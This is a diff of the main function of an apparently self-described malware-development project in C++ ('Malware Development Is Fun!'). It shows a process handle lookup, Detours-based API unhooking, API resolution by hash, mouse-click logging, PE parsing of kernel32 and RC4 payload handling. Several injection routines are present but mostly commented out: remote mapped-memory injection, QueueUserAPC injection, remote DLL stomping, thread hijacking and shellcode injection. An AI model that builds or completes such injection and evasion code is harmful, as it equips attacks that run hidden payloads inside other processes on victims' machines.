@@ -10,6 +10,7 @@ int main()
 								  dwThreadId				= NULL,
 								  dwThreadId1				= NULL,
 								  dwThreadId2				= NULL,
+								  dwImageSize				= NULL,
 								  dwHashedString1			= 0xFBB639B7,
 								  dwHashedString2			= 0xB6E8EE02;
 
@@ -68,7 +69,7 @@ int main()
 	Context						  RC4Context_t				= { };
 	RESOURCE					  resource					= { };
 	PVOID						  fnLMBClick				= nullptr;
-
+	
 	hHeap = GetProcessHeap();
 
 	if (hHeap == nullptr || hHeap == INVALID_HANDLE_VALUE) return -0x99;
@@ -79,7 +80,11 @@ int main()
 
 	FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess);
 
-	pImagePath = FetchPathFromRemoteProcess(hProcess);
+	pImagePath = FetchImagePathFromRemoteProcess(hProcess);
+
+	pImageData = FetchImageData(pImagePath, hHeap, &dwImageSize);
+
+	if (pImageData == nullptr) return -97;
 
 	hThread = GetCurrentThread();
 
@@ -90,12 +95,6 @@ int main()
 	if (UnHookLocalThreadUsingDetours(reinterpret_cast<PVOID>(MessageBoxA), reinterpret_cast<PVOID>(HookedMessageBoxA), hThread) == FALSE) return 2;
 
 	MessageBoxA(nullptr, "Malware Development Is Fun!\n", "API UnHooked Message", MB_OKCANCEL | MB_ICONEXCLAMATION);
-
-	//MiceHandlesTests();
-
-	pExtPayloadAddress = static_cast<PBYTE>(malloc(20));
-
-	//MapLocalMemory(pExtPayloadAddress, &pExPayload, 15, &hHeap);
 
 	LogConsoleMouseClicks();
 
@@ -118,14 +117,16 @@ int main()
 	//wprintf(L"\t[+] Hash Of \"%s\" is: 0x%lX\n",pTargetStringToHash, dwHashedString);
 
 	GetProcessAddressReplacementH(hModuleCustom, dwHashedString1);
-
+	
 	if (FetchProcessHandleNtQuerySystemInformation(TargetProcessName, &dwHashedString2, &hProcess) == FALSE) printf(":(\n");
 
-	pImagePath = FetchPathFromRemoteProcess(hProcess);
+	pImagePath = FetchImagePathFromRemoteProcess(hProcess);
 
 	printf("Starting PE Parser...\n");
 
-	if (FetchImageData(const_cast<LPWSTR>(L"C:\\WINDOWS\\System32\\kernel32.dll"), hHeap, &pImageData) == TRUE) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
+	pImageData = FetchImageData(const_cast<LPWSTR>(L"C:\\WINDOWS\\System32\\kernel32.dll"), hHeap, &dwImageSize);
+
+	if (pImageData == nullptr) printf("[!] Parsing: C:\\WINDOWS\\System32\\kernel32.dll\n");
 
 	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);
 
@@ -290,7 +291,7 @@ for (DWORD i = 0; i < pImageExportDirectory->NumberOfNames; i++)
 
 //InjectPayloadRemoteMappedMemory(pStompingTarget, &pExtPayloadAddres, &pObfInput, resource.sSize, &hPayloadObjectHandle, hProcess);
 
-//APCPayloadInjection(hThread, pObfInput, resource.sSize);
+//InjectPayloadQueueUserAPC(hThread, pObfInput, resource.sSize);
 //InjectRemoteDll(pObfInput, hProcess, SACRIFICIAL_DLL, SACRIFICIAL_FUNC, resource.sSize, &pStompingTarget);
 
 /*Payload Execution Control Code
@@ -346,7 +347,7 @@ for (int i = 0; i < 10; i++) {
 
 //HijackThread(hThread, pStompingTarget);
 
-	//if (!APCPayloadInjection(hThread1, pExPayload, pPayload_t.sText)) return -6;
+	//if (!InjectPayloadQueueUserAPC(hThread1, pExPayload, pPayload_t.sText)) return -6;
 
 	//if (!InjectRemoteProcessShellcode(hProcess, pPayload_t.pText, pPayload_t.sText, &pExPayload))printf("[!] Failed To Inject Shellcode!\n");
 
